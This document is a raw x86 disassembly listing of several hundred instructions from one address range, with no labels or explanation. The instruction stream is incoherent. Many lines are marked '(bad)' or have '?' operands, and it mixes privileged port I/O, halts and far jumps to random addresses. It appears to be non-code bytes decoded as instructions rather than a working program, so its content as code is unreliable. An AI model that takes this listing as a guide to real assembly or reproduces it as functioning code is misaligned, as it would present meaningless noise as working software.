  41a760:	mov    al,0xa6
  41a762:	pop    ebx
  41a763:	xlat   BYTE PTR ds:[ebx]
  41a764:	repz imul edx,DWORD PTR ds:0xa1d6a3fd,0x68f293e8
  41a76f:	lods   eax,DWORD PTR ds:[esi]
  41a770:	pop    es
  41a771:	jmp    0x41a6f3
  41a773:	scas   al,BYTE PTR es:[edi]
  41a774:	popa   
  41a775:	fcomp  QWORD PTR [ecx+edx*8]
  41a778:	push   ebx
  41a779:	inc    ebx
  41a77a:	push   eax
  41a77b:	mov    ebp,esp
  41a77d:	loop   0x41a71f
  41a77f:	cld    
  41a780:	out    0xec,al
  41a782:	xor    BYTE PTR [ebx+0x66ec38bd],cl
  41a788:	scas   eax,DWORD PTR es:[edi]
  41a789:	cdq    
  41a78a:	mov    esp,0xf89927a8
  41a78f:	bswap  ebp
  41a791:	jg     0x41a749
  41a793:	cmp    DWORD PTR [esi],ebx
  41a795:	pop    di
  41a797:	push   esp
  41a798:	or     eax,0xbb173be5
  41a79d:	adc    ecx,edx
  41a79f:	(bad)  
  41a7a2:	mov    ah,0x54
  41a7a4:	mov    dl,0x90
  41a7a6:	xchg   esi,eax
  41a7a7:	mov    esi,0x1867141c
  41a7ac:	or     BYTE PTR [ebp+0x389d0aeb],ah
  41a7b2:	imul   ebp,DWORD PTR [edx+0x41],0x5523c8d5
  41a7b9:	jae    0x41a78b
  41a7bb:	ret    0x1ba9
  41a7be:	fldcw  WORD PTR [esi]
  41a7c0:	push   ds
  41a7c1:	fmul   DWORD PTR [ebp-0x67cab73b]
  41a7c7:	jecxz  0x41a771
  41a7c9:	mov    eax,0x805f715e
  41a7ce:	psubsw mm3,QWORD PTR [ebp-0x35]
  41a7d2:	shr    ecx,0x21
  41a7d5:	fisttp QWORD PTR [ecx+0x5f06e077]
  41a7db:	jp     0x41a7ba
  41a7dd:	in     eax,0x8f
  41a7df:	loope  0x41a80d
  41a7e1:	jnp    0x41a84d
  41a7e3:	data16 je 0x41a84a
  41a7e6:	enter  0x3dd7,0xab
  41a7ea:	in     eax,0xd4
  41a7ec:	out    dx,eax
  41a7ed:	ds cld 
  41a7ef:	sub    DWORD PTR [ecx-0x14],esi
  41a7f2:	icebp  
  41a7f3:	scas   al,BYTE PTR es:[edi]
  41a7f4:	adc    eax,0xd5809732
  41a7f9:	jae    0x41a825
  41a7fb:	cld    
  41a7fc:	mov    edi,0x84587cfe
  41a801:	and    edi,DWORD PTR [ecx]
  41a803:	push   esi
  41a804:	inc    ebp
  41a805:	out    0x76,al
  41a807:	push   ebx
  41a808:	or     edi,0x93c3d7e0
  41a80e:	fiadd  WORD PTR [ebx]
  41a810:	adc    esp,DWORD PTR [edi]
  41a812:	ror    DWORD PTR [ecx-0x12],0xd6
  41a816:	ret    0xbdc
  41a819:	clc    
  41a81a:	xchg   esp,eax
  41a81b:	in     eax,dx
  41a81c:	(bad)  
  41a81d:	hlt    
  41a81e:	mov    ds:0x392a99a3,al
  41a823:	popa   
  41a824:	adc    al,0xf6
  41a826:	mov    edx,0x8f1f84c1
  41a82b:	(bad)  
  41a82c:	(bad)  
  41a82d:	in     al,0x44
  41a82f:	mov    ?,ebp
  41a831:	int3   
  41a832:	loop   0x41a83f
  41a834:	pop    ebp
  41a835:	fs out dx,al
  41a837:	inc    esi
  41a838:	dec    esi
  41a839:	pop    eax
  41a83a:	mov    al,0xe5
  41a83c:	push   ecx
  41a83d:	cmc    
  41a83e:	push   edi
  41a83f:	and    DWORD PTR [edi-0x453a2905],esp
  41a845:	call   0x23b0763c
  41a84a:	xchg   ebx,eax
  41a84b:	outs   dx,DWORD PTR ds:[esi]
  41a84c:	das    
  41a84d:	fsubr  QWORD PTR [eax]
  41a84f:	pop    edx
  41a850:	fld    QWORD PTR [esi]
  41a852:	clc    
  41a853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a854:	xchg   ebp,eax
  41a855:	and    ch,BYTE PTR [esi-0x14]
  41a858:	das    
  41a859:	popf   
  41a85a:	or     DWORD PTR [edx+0x7c],ebp
  41a85d:	mov    dh,0x80
  41a85f:	sub    al,0x9b
  41a861:	and    al,BYTE PTR [ecx-0x74]
  41a864:	jno    0x41a86e
  41a866:	push   cs
  41a867:	popa   
  41a868:	pop    ds
  41a869:	out    dx,eax
  41a86a:	add    dh,BYTE PTR [ebx]
  41a86c:	xchg   edx,eax
  41a86d:	sub    ah,BYTE PTR [ebx]
  41a86f:	sub    esp,DWORD PTR [eax+ebp*1-0x577f2787]
  41a876:	cli    
  41a877:	inc    eax
  41a878:	push   ebx
  41a879:	xchg   BYTE PTR [ecx],cl
  41a87b:	int    0x39
  41a87d:	call   0x8ef6669c
  41a882:	and    al,0xb9
  41a884:	ja     0x41a8fe
  41a886:	xor    esi,DWORD PTR [esi-0x106c89c1]
  41a88c:	mov    esp,0xc3d5af0a
  41a891:	test   BYTE PTR [edi+edi*4+0x77],bh
  41a895:	jp     0x41a8f2
  41a897:	mov    eax,0x985b5421
  41a89c:	cmp    eax,0x8af12514
  41a8a1:	jmp    0x41a8de
  41a8a3:	pop    ecx
  41a8a4:	loope  0x41a8f4
  41a8a6:	imul   esp,eax,0x4a
  41a8a9:	mov    ebx,0x4221782f
  41a8ae:	dec    edx
  41a8b0:	das    
  41a8b1:	ins    BYTE PTR es:[edi],dx
  41a8b2:	cmp    DWORD PTR [ebx+0x18bb5f76],0x83f93383
  41a8bc:	xor    al,0xbf
  41a8be:	ins    BYTE PTR es:[edi],dx
  41a8bf:	aad    0xfe
  41a8c1:	ds aas 
  41a8c3:	test   al,0x99
  41a8c5:	jns    0x41a8ad
  41a8c7:	call   0x3cb8:0x7f4ca66e
  41a8ce:	call   0xf661:0x3a7825a2
  41a8d5:	out    0x7c,al
  41a8d7:	aad    0x48
  41a8d9:	addr16 aaa 
  41a8db:	retf   
  41a8dc:	out    dx,eax
  41a8dd:	mov    ebx,0x8716d3c2
  41a8e2:	or     DWORD PTR [edi*8+0x6f5b2e39],eax
  41a8e9:	lds    edx,FWORD PTR [esi]
  41a8eb:	cld    
  41a8ec:	mov    eax,ds:0x49cb0a2
  41a8f1:	jl     0x41a889
  41a8f3:	hlt    
  41a8f4:	retf   0x87a1
  41a8f7:	pop    es
  41a8f8:	loop   0x41a964
  41a8fa:	jno    0x41a8bf
  41a8fc:	(bad)  
  41a8fd:	mov    cl,0xcb
  41a8ff:	fyl2xp1 
  41a901:	div    BYTE PTR [ecx+0x36]
  41a904:	ficomp WORD PTR [ecx]
  41a906:	xor    bh,BYTE PTR [ebx+0x15]
  41a909:	je     0x41a8c9
  41a90b:	mov    esi,0x326a9ab5
  41a910:	test   eax,0x58d1a67
  41a915:	sub    al,0x64
  41a917:	mov    edi,0xa9201363
  41a91c:	icebp  
  41a91d:	mov    cl,0x1c
  41a91f:	fld    DWORD PTR [ebp+0x7e517ee]
  41a925:	and    ebp,esp
  41a927:	mov    al,0x70
  41a929:	jl     0x41a8b8
  41a92b:	mov    dl,BYTE PTR [ecx+0x174452d7]
  41a931:	test   al,0x8a
  41a933:	jae    0x41a988
  41a935:	addr16 mov ds:0x8f73,eax
  41a939:	dec    edx
  41a93a:	dec    edi
  41a93b:	lods   al,BYTE PTR ds:[esi]
  41a93c:	jmp    0x41a916
  41a93e:	lea    eax,[ecx-0x13]
  41a941:	outs   dx,BYTE PTR ds:[esi]
  41a942:	xchg   ecx,eax
  41a943:	jns    0x41a902
  41a945:	sahf   
  41a946:	xchg   dl,bl
  41a948:	(bad)  
  41a94a:	call   0x8dcc12b4
  41a94f:	push   edx
  41a950:	mov    esi,0x4ed5c59f
  41a955:	gs xchg ebp,eax
  41a957:	jmp    0xc30d:0x54133f13
  41a95e:	imul   esi,eax,0x44
  41a961:	mov    dh,0x85
  41a963:	mov    WORD PTR [eax],?
  41a965:	mov    eax,0x53bda46c
  41a96a:	mov    eax,ds:0x3a25ebbf
  41a96f:	lods   eax,DWORD PTR ds:[esi]
  41a970:	and    DWORD PTR [eax-0x69b9a20e],edx
  41a976:	sbb    ah,cl
  41a978:	lds    ebp,FWORD PTR [ebp-0x74]
  41a97b:	pushf  
  41a97c:	add    BYTE PTR [edx-0x4c],0x13
  41a980:	loope  0x41a9bd
  41a982:	retf   0xbedf
  41a985:	pop    ss
  41a986:	inc    esi
  41a987:	popf   
  41a988:	sub    BYTE PTR [esi+0xae73c82],0x47
  41a98f:	pop    esp
  41a990:	mov    WORD PTR [eax],?
  41a992:	dec    edx
  41a993:	jbe    0x41aa0b
  41a995:	cdq    
  41a996:	neg    BYTE PTR [edi-0x4074f0ed]
  41a99c:	xchg   edx,eax
  41a99d:	in     al,dx
  41a99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a99f:	aam    0x62
  41a9a1:	shr    BYTE PTR [eax-0x4ad08202],cl
  41a9a7:	sub    eax,0x954292e
  41a9ac:	shr    DWORD PTR [edx-0x40],0xe3
  41a9b0:	add    DWORD PTR [esi+ebp*8-0x64],esi
  41a9b4:	fistp  WORD PTR [ecx]
  41a9b6:	fmulp  st(3),st
  41a9b8:	shl    ah,cl
  41a9ba:	gs (bad) 
  41a9bc:	(bad)
  41a9c0:	test   al,0x0
  41a9c2:	out    dx,al
  41a9c3:	push   ebx
  41a9c4:	and    al,0x5b
  41a9c6:	neg    DWORD PTR [esi+0x45]
  41a9c9:	or     eax,0x52fce86e
  41a9ce:	inc    esp
  41a9cf:	popf   
  41a9d0:	in     al,0x24
  41a9d2:	gs sub eax,0x7aec9a66
  41a9d8:	mov    ebx,0x77ffd6df
  41a9dd:	int3   
  41a9de:	(bad)  
  41a9e0:	add    eax,0xfcba831f
  41a9e5:	pop    ebp
  41a9e6:	mov    ah,0xc0
  41a9e8:	dec    ecx
  41a9e9:	xchg   ecx,eax
  41a9ea:	test   ch,0x24
  41a9ed:	sub    DWORD PTR [esi+edx*1-0x70],0x29
  41a9f2:	mov    al,0x88
  41a9f4:	dec    ebx
  41a9f5:	mov    cl,0xbf
  41a9f7:	das    
  41a9f8:	out    dx,al
  41a9f9:	std    
  41a9fa:	outs   dx,BYTE PTR ds:[esi]
  41a9fb:	push   ebp
  41a9fc:	retf   
  41a9fd:	scas   eax,DWORD PTR es:[edi]
  41a9fe:	mov    al,0x6d
  41aa00:	xchg   DWORD PTR [esi-0x71],edx
  41aa03:	add    eax,0xad99260e
  41aa08:	cdq    
  41aa09:	push   esi
  41aa0a:	fidiv  WORD PTR [edi-0x53]
  41aa0d:	add    BYTE PTR [ecx],bh
  41aa0f:	xchg   DWORD PTR [edx],esp
  41aa11:	loope  0x41a9cc
  41aa13:	shl    dl,cl
  41aa15:	ret    0xb291
  41aa18:	xor    al,0x71
  41aa1a:	xchg   edx,eax
  41aa1b:	sbb    al,0xa2
  41aa1d:	mov    bh,0x76
  41aa1f:	fidivr WORD PTR [ebx]
  41aa21:	dec    edx
  41aa22:	inc    ebx
  41aa23:	adc    BYTE PTR [ebx+0x16489cfc],0xc0
  41aa2a:	into   
  41aa2b:	push   edi
  41aa2c:	enter  0x43d9,0xda
  41aa30:	aaa    
  41aa31:	mov    ds:0xd0e0cd24,eax
  41aa36:	lock or BYTE PTR [eax+0x34],al
  41aa3a:	push   ebx
  41aa3b:	ficomp WORD PTR [edx+edx*8-0x31629b0a]
  41aa42:	pop    ds
  41aa43:	mov    ebp,0x1e1481a8
  41aa48:	ja     0x41aa00
  41aa4a:	(bad)  
  41aa4b:	cmc    
  41aa4c:	fwait
  41aa4d:	lods   eax,DWORD PTR ds:[esi]
  41aa4e:	fs pop edx
  41aa50:	mov    WORD PTR [eax+eax*4+0x52],fs
  41aa54:	int3   
  41aa55:	xor    ecx,DWORD PTR [esi+0x72]
  41aa58:	pop    esi
  41aa59:	call   0x1fa3:0xb139aab9
  41aa60:	xor    dh,BYTE PTR [edx+0x10]
  41aa63:	jp     0x41aa1b
  41aa65:	repz iret 
  41aa67:	imul   ebx,ebx,0x5
  41aa6a:	repnz lea ecx,[ebp-0x540b57f4]
  41aa71:	fcom   QWORD PTR [ebx]
  41aa73:	int    0x45
  41aa75:	sbb    ebx,0x6de8833e
  41aa7b:	cmp    al,0x28
  41aa7d:	xchg   DWORD PTR [esi],eax
  41aa7f:	cs ds loop 0x41aa28
  41aa83:	and    dl,BYTE PTR [eax-0x2c]
  41aa86:	inc    eax
  41aa87:	loop   0x41aab2
  41aa89:	frstor ds:0xeda62a48
  41aa8f:	and    esi,DWORD PTR [ebx+0x114d4f18]
  41aa95:	jmp    0x244de92
  41aa9a:	in     eax,dx
  41aa9b:	mov    bl,0x19
  41aa9d:	shr    BYTE PTR [esi-0x609d8bb8],1
  41aaa3:	add    al,0xc2
  41aaa5:	ins    DWORD PTR es:[edi],dx
  41aaa6:	enter  0xa3cf,0x33
  41aaaa:	jo     0x41aaf5
  41aaac:	mov    ecx,0xf0353426
  41aab1:	repz das 
  41aab3:	add    DWORD PTR [esi+0x6ea1493f],ebx
  41aab9:	aas    
  41aaba:	in     eax,dx
  41aabb:	jl     0x41aa73
  41aabd:	add    DWORD PTR [edx],0x7f
  41aac0:	mov    ebp,0x18c4bcc
  41aac5:	xor    al,0x3d
  41aac7:	cmp    al,0x29
  41aac9:	adc    eax,0x96b4da02
  41aace:	ror    BYTE PTR [esi],1
  41aad0:	aas    
  41aad1:	push   ebx
  41aad2:	mov    edx,0x2ce69b68
  41aad7:	pushf  
  41aad8:	xor    dl,BYTE PTR [edi+0xc72c71b]
  41aade:	pop    edi
  41aadf:	rcl    BYTE PTR [edx],0x8a
  41aae2:	xchg   esi,eax
  41aae3:	sbb    BYTE PTR [esi+0x5e],bh
  41aae6:	inc    eax
  41aae7:	cmp    ah,BYTE PTR [eax]
  41aae9:	cmc    
  41aaea:	inc    ebx
  41aaeb:	loop   0x41aa7c
  41aaed:	and    DWORD PTR ds:0xfa0c7c16,esi
  41aaf3:	ss jp  0x41aaba
  41aaf6:	adc    al,0xf7
  41aaf8:	sub    esi,DWORD PTR [edi-0x18]
  41aafb:	in     eax,0xce
  41aafd:	int    0x62
  41aaff:	dec    DWORD PTR [esi-0x7ee9443f]
  41ab05:	clc    
  41ab06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab07:	mov    DWORD PTR [ecx],edi
  41ab09:	mov    bh,0xb1
  41ab0b:	sti    
  41ab0c:	ins    DWORD PTR es:[edi],dx
  41ab0d:	(bad)  
  41ab0e:	lods   eax,DWORD PTR ds:[esi]
  41ab0f:	mov    eax,0x6bde085
  41ab14:	and    BYTE PTR [edi+eiz*8-0x58700bf4],al
  41ab1b:	adc    DWORD PTR [edx],esp
  41ab1d:	sti    
  41ab1e:	xor    eax,0xb0606223
  41ab23:	scas   al,BYTE PTR es:[edi]
  41ab24:	jge    0x41ab81
  41ab26:	sbb    BYTE PTR [esi],bh
  41ab28:	push   0xffffffe9
  41ab2a:	dec    ecx
  41ab2b:	js     0x41ab18
  41ab2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab2e:	mov    esp,esi
  41ab30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab31:	sahf   
  41ab32:	or     DWORD PTR [ebp-0x7c292322],ecx
  41ab38:	or     esp,DWORD PTR [eax]
  41ab3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab3b:	jp     0x41ab00
  41ab3d:	leave  
  41ab3e:	jg     0x41ab3e
  41ab40:	(bad)  
  41ab41:	cmp    ebp,DWORD PTR [ebp+0xaebf72f]
  41ab47:	sub    ebp,DWORD PTR [edi+ebx*1]
  41ab4a:	sbb    ch,bl
  41ab4c:	jg     0x41ab91
  41ab4e:	fisubr WORD PTR ds:0xd0a8631d
  41ab54:	ret    
  41ab55:	ja     0x41ab98
  41ab57:	adc    ah,BYTE PTR [ecx]
  41ab59:	pop    esi
  41ab5a:	fsub   DWORD PTR [edx]
  41ab5c:	mov    ah,0x9d
  41ab5e:	sbb    edi,DWORD PTR [eax+0x5]
  41ab61:	pop    es
  41ab62:	sbb    eax,0xfda382aa
  41ab67:	push   cs
  41ab68:	es popf 
  41ab6a:	cli    
  41ab6b:	test   DWORD PTR [esi-0x58a718ad],ebx
  41ab71:	jbe    0x41abd8
  41ab73:	lahf   
  41ab74:	pop    esp
  41ab75:	sub    eax,0xcce831f4
  41ab7a:	nop
  41ab7b:	add    eax,esp
  41ab7d:	ficomp WORD PTR [ebx-0x35178127]
  41ab83:	enter  0x82d2,0xab
  41ab87:	or     al,0xb8
  41ab89:	sub    esi,DWORD PTR [edx+eiz*4]
  41ab8c:	jo     0x41ab14
  41ab8e:	loop   0x41ab42
  41ab90:	retf   0xfd45
  41ab93:	sbb    al,0xf9
  41ab95:	adc    DWORD PTR [esi],ebx
  41ab97:	sbb    ah,BYTE PTR [eax]
  41ab99:	pop    edx
  41ab9a:	dec    eax
  41ab9b:	scas   eax,DWORD PTR es:[edi]
  41ab9c:	call   0x9e46c35a
  41aba1:	adc    edi,DWORD PTR [ecx]
  41aba3:	xchg   esi,eax
  41aba4:	out    dx,eax
  41aba5:	mov    ch,0xa3
  41aba7:	jp     0x41ab44
  41aba9:	cmp    eax,0x98585eca
  41abae:	lahf   
  41abaf:	mov    ah,0x9
  41abb1:	mov    bl,0x8d
  41abb3:	sahf   
  41abb4:	ret    
  41abb5:	pop    ds
  41abb6:	push   cs
  41abb7:	call   0x2f678a4d
  41abbc:	ficomp DWORD PTR [eax+0x23]
  41abbf:	adc    al,0xb
  41abc1:	rcr    BYTE PTR [edi+0x41],0xc8
  41abc5:	push   edi
  41abc6:	popa   
  41abc7:	sub    BYTE PTR [eax-0x66],ch
  41abca:	jb     0x41ab9c
  41abcc:	fwait
  41abcd:	jge    0x41abce
  41abcf:	xor    al,0xb3
  41abd1:	ins    BYTE PTR es:[edi],dx
  41abd2:	jb     0x41abb4
  41abd4:	in     al,dx
  41abd5:	xchg   DWORD PTR [esi-0x7b],edi
  41abd8:	push   eax
  41abd9:	ffree  st(1)
  41abdb:	adc    eax,0x506d43bd
  41abe0:	jmp    0x41aba7
  41abe2:	sub    DWORD PTR [esi-0xe],esi
  41abe5:	jmp    0xc8c01c22
  41abea:	xchg   DWORD PTR [ebp+0x43],ebx
  41abed:	cli    
  41abee:	sar    DWORD PTR [eax],0xe
  41abf1:	xor    ecx,DWORD PTR [ebp-0x60662877]
  41abf7:	ret    
  41abf8:	jbe    0x41ac3a
  41abfa:	pop    edi
  41abfb:	or     al,0x2f
  41abfd:	leave  
  41abfe:	xor    esp,DWORD PTR [edi+0x1]
  41ac01:	test   BYTE PTR [ebp+ebx*8+0x1c],dl
  41ac05:	ins    DWORD PTR es:[edi],dx
  41ac06:	hlt    
  41ac07:	lea    ecx,[eax]
  41ac09:	faddp  st(0),st
  41ac0b:	cwde   
  41ac0c:	outs   dx,BYTE PTR ds:[esi]
  41ac0d:	inc    esi
  41ac0e:	push   edx
  41ac0f:	arpl   WORD PTR [edx-0x404f844e],di
  41ac15:	iret   
  41ac16:	dec    edi
  41ac17:	das    
  41ac18:	dec    eax
  41ac19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac1a:	push   ds
  41ac1b:	cmovbe esp,DWORD PTR [edx-0x6b97b4f0]
  41ac22:	retf   
  41ac23:	(bad)  
  41ac25:	mov    ebp,0xe907e6a1
  41ac2a:	fs retf 
  41ac2c:	stos   BYTE PTR es:[edi],al
  41ac2d:	push   ss
  41ac2e:	sbb    BYTE PTR [ebp+0xd2e6b2d],cl
  41ac34:	es adc ebp,edi
  41ac37:	cmp    ecx,esp
  41ac39:	xor    DWORD PTR [esi+ebx*8],edi
  41ac3c:	mov    bh,0x0
  41ac3e:	add    BYTE PTR [eax],al
  41ac40:	add    BYTE PTR [eax],al
  41ac42:	dec    ebp
  41ac43:	dec    ebp
  41ac44:	ss retf 0xfb36
  41ac48:	std    
  41ac49:	iret   
  41ac4a:	cmp    esp,DWORD PTR [edx]
  41ac4c:	(bad)  
  41ac4d:	cld    
  41ac4e:	dec    ebx
  41ac4f:	fadd   QWORD PTR [edi-0x32]
  41ac52:	pushf  
  41ac53:	sub    BYTE PTR [ecx],al
  41ac55:	add    bl,dh
  41ac57:	add    al,0x0
  41ac59:	add    BYTE PTR [esi+ecx*2],al
  41ac5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac5d:	call   0xfcb4a38d
  41ac62:	sub    eax,0x8db3ab12
  41ac67:	push   0x6f
  41ac69:	push   eax
  41ac6a:	js     0x41ac04
  41ac6c:	inc    eax
  41ac6d:	int    0x3f
  41ac6f:	repnz cdq 
  41ac71:	xchg   ebp,eax
  41ac72:	cs mov dh,0x6d
  41ac75:	adc    ah,cl
  41ac77:	add    eax,DWORD PTR [ebp-0x4cb3df77]
  41ac7d:	into   
  41ac7e:	int3   
  41ac7f:	xchg   edi,eax
  41ac80:	in     al,0x6d
  41ac82:	ret    0x9bff
  41ac85:	dec    esi
  41ac86:	lea    esp,[ebp+ecx*2+0x712c513e]
  41ac8d:	push   cs
  41ac8e:	out    dx,al
  41ac8f:	mov    ds:0x154424c3,eax
  41ac94:	icebp  
  41ac95:	mov    al,0xde
  41ac97:	cli    
  41ac98:	mov    al,0xc3
  41ac9a:	mov    ds:0xf0a304b6,al
  41ac9f:	xor    al,0x78
  41aca1:	push   edx
  41aca2:	scas   al,BYTE PTR es:[edi]
  41aca3:	test   esi,ecx
  41aca5:	lds    esp,FWORD PTR [eax+0x6e]
  41aca8:	xchg   edx,eax
  41aca9:	inc    edi
  41acaa:	sbb    eax,0x28e060da
  41acaf:	cmp    DWORD PTR [edx-0x33],0x753d5166
  41acb6:	push   esi
  41acb7:	and    BYTE PTR [eax],bl
  41acb9:	jg     0x41ace5
  41acbb:	cmp    ebp,DWORD PTR [esi]
  41acbd:	ss mov edi,0xa353a360
  41acc3:	push   ds
  41acc4:	(bad)  
  41acc5:	add    al,0x9e
  41acc7:	sub    al,ah
  41acc9:	scas   eax,DWORD PTR es:[edi]
  41acca:	js     0x41acff
  41accc:	bnd jb 0x41aca4
  41accf:	js     0x41ad36
  41acd1:	jl     0x41acb5
  41acd3:	lock in al,dx
  41acd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acd6:	xor    DWORD PTR [ebp-0x21db1c34],esp
  41acdc:	icebp  
  41acdd:	xor    DWORD PTR [eax+edx*4+0xd3f262],edx
  41ace4:	repz mov ebp,0xeee7b54
  41acea:	pop    ebx
  41aceb:	loopne 0x41ad15
  41aced:	mov    ds:0xe5086b95,al
  41acf2:	loop   0x41acf8
  41acf4:	leave  
  41acf5:	xlat   BYTE PTR ds:[ebx]
  41acf6:	retf   0x8a7
  41acf9:	in     eax,dx
  41acfa:	mov    WORD PTR [ebx],gs
  41acfc:	lock mov bl,0x38
  41acff:	les    ebx,FWORD PTR [eax]
  41ad01:	retf   
  41ad02:	ficom  DWORD PTR [ebx+ebp*4-0x4]
  41ad06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad07:	cmc    
  41ad08:	mov    bl,0xf7
  41ad0a:	push   ecx
  41ad0b:	dec    esp
  41ad0c:	sub    al,0xf5
  41ad0e:	jmp    0x7e2d0f1e
  41ad13:	bound  esi,QWORD PTR [edi-0x4d]
  41ad16:	retf   0x5901
  41ad19:	dec    ebx
  41ad1a:	pop    ebx
  41ad1b:	loopne 0x41ad84
  41ad1d:	retf   
  41ad1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad1f:	sub    eax,0xc7fb5812
  41ad24:	(bad)  
  41ad26:	fdivrp st(0),st
  41ad28:	jl     0x41acd5
  41ad2a:	mov    al,0xd7
  41ad2c:	mov    ds:0x8a9bd549,eax
  41ad31:	hlt    
  41ad32:	test   ch,0xa8
  41ad35:	sub    DWORD PTR [eax-0x3a11f31f],0xffffffc1
  41ad3c:	test   eax,0x902e2e69
  41ad41:	repnz add al,0x2f
  41ad44:	rcl    BYTE PTR [eax+eax*4],cl
  41ad47:	loope  0x41adb5
  41ad49:	mov    dh,0xdc
  41ad4b:	retf   
  41ad4c:	test   DWORD PTR [ebp+0x46],ebx
  41ad4f:	jb     0x41ad9a
  41ad51:	mov    esi,0xeb9d2a11
  41ad56:	push   0xd882b0ab
  41ad5b:	pop    esi
  41ad5c:	pop    ds
  41ad5d:	mov    BYTE PTR [edx+0x1d],al
  41ad60:	jmp    0x5c9fabb6
  41ad65:	mov    esp,0x56fedff4
  41ad6a:	pop    esp
  41ad6b:	int    0x62
  41ad6d:	hlt    
  41ad6e:	mov    ebx,0xe3540600
  41ad73:	int    0x90
  41ad75:	test   eax,0x6810338e
  41ad7a:	in     eax,0x92
  41ad7c:	das    
  41ad7d:	bound  edi,QWORD PTR [esi+ecx*8+0x68216253]
  41ad84:	add    DWORD PTR [eax],edx
  41ad86:	shl    BYTE PTR [ecx+0xc],1
  41ad89:	mov    ch,0x17
  41ad8b:	sub    eax,0xcb4279a1
  41ad90:	fwait
  41ad91:	pop    ss
  41ad92:	gs retf 
  41ad94:	xchg   ecx,eax
  41ad95:	jp     0x41adab
  41ad97:	pop    edi
  41ad98:	cmp    al,0x4d
  41ad9a:	loopne 0x41adb2
  41ad9c:	leave  
  41ad9d:	mov    ah,0x76
  41ad9f:	mov    ebx,0xce3a7efe
  41ada4:	mov    ebp,0x2a005def
  41ada9:	fdivrp st(4),st
  41adab:	aaa    
  41adac:	iret   
  41adad:	pop    eax
  41adae:	and    DWORD PTR [ecx],0xf79e65d8
  41adb4:	xchg   esp,eax
  41adb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb6:	in     eax,0xa4
  41adb8:	mov    esp,?
  41adba:	pop    edi
  41adbb:	cdq    
  41adbc:	scas   eax,DWORD PTR es:[edi]
  41adbd:	push   0x90349e14
  41adc2:	popa   
  41adc3:	or     ecx,DWORD PTR [edi]
  41adc5:	sbb    DWORD PTR [ecx+0x10],edi
  41adc8:	add    bl,BYTE PTR [eax-0x54a0e3a7]
  41adce:	shl    BYTE PTR [eax-0x371bab5a],1
  41add4:	mov    ah,0xbf
  41add6:	jp     0x41ad64
  41add8:	out    dx,eax
  41add9:	stc    
  41adda:	cli    
  41addb:	dec    esi
  41addc:	fbstp  TBYTE PTR [edi-0x9]
  41addf:	pop    ds
  41ade0:	mov    eax,ds:0xdebd1427
  41ade5:	adc    DWORD PTR [eax-0x38],esi
  41ade8:	call   0xd4fa33f3
  41aded:	push   ds
  41adee:	cmp    eax,0xc9ed5feb
  41adf3:	imul   ecx,DWORD PTR [esi-0x7360dbe7],0x3075516a
  41adfd:	rol    bh,0xf
  41ae00:	jns    0x41ae00
  41ae02:	je     0x41adef
  41ae04:	fwait
  41ae05:	pop    eax
  41ae06:	arpl   WORD PTR [ecx+0x17fe6618],di
  41ae0c:	jb     0x41ae74
  41ae0e:	mov    dh,0x94
  41ae10:	sbb    eax,0x140d8c63
  41ae15:	sub    esi,DWORD PTR [edx-0x8dcc41f]
  41ae1b:	jno    0x41ae07
  41ae1d:	mov    ?,edi
  41ae1f:	sbb    al,0xfb
  41ae21:	mov    WORD PTR [esi-0x25],gs
  41ae24:	mov    esi,0x7e42bdd8
  41ae29:	cld    
  41ae2a:	icebp  
  41ae2b:	call   0x54a0:0xd3118383
  41ae32:	clc    
  41ae33:	lock jnp 0x41ae7b
  41ae36:	pmulhuw mm4,QWORD PTR [esi+0x2e]
  41ae3a:	fld    DWORD PTR [edi+0x185739ef]
  41ae40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae41:	call   0xff40:0x2d1ed929
  41ae48:	adc    esi,DWORD PTR [edx]
  41ae4a:	neg    DWORD PTR [esi+0x5e82541e]
  41ae50:	fxch   st(7)
  41ae52:	dec    esi
  41ae53:	arpl   WORD PTR [ecx+edi*8+0x62],bp
  41ae57:	ins    DWORD PTR es:[edi],dx
  41ae58:	ja     0x41ae30
  41ae5a:	stos   BYTE PTR es:[edi],al
  41ae5b:	fiadd  DWORD PTR [edi+0x44390d2c]
  41ae61:	cmove  ebp,edx
  41ae64:	cmp    al,0x98
  41ae66:	push   eax
  41ae67:	jl     0x41ae31
  41ae69:	mov    cl,0x57
  41ae6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae6c:	addr16 out 0xc8,eax
  41ae6f:	jmp    0x41aede
  41ae71:	xchg   esp,eax
  41ae72:	clc    
  41ae73:	sbb    bl,BYTE PTR [ecx]
  41ae75:	mov    ch,0x2e
  41ae77:	imul   eax,DWORD PTR [esi-0x3ab6f129],0x4d
  41ae7e:	xlat   BYTE PTR ds:[ebx]
  41ae7f:	pop    ebp
  41ae80:	js     0x41aef8
  41ae82:	repnz cli 
  41ae84:	lods   al,BYTE PTR ds:[esi]
  41ae85:	xchg   ecx,eax
  41ae86:	lahf   
  41ae87:	fwait
  41ae88:	(bad)  
  41ae89:	mov    ecx,0xcfff4253
  41ae8e:	jecxz  0x41ae36
  41ae90:	out    0x6,eax
  41ae92:	cld    
  41ae93:	pushf  
  41ae94:	dec    ebp
  41ae95:	xchg   edi,eax
  41ae96:	jg     0x41af0e
  41ae98:	iret   
  41ae99:	jg     0x41ae4e
  41ae9b:	jmp    0x9602:0xd533351e
  41aea2:	out    dx,al
  41aea3:	mov    edi,0x970c205a
  41aea8:	sbb    al,0x75
  41aeaa:	and    eax,0xab0b6dac
  41aeaf:	(bad)  
  41aeb0:	jge    0x41aef6
  41aeb2:	shr    BYTE PTR [esi+0x52],1
  41aeb5:	mov    ch,0x50
  41aeb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb8:	mov    ebp,0x77ca38b1
  41aebd:	sbb    esp,edi
  41aebf:	add    bh,ch
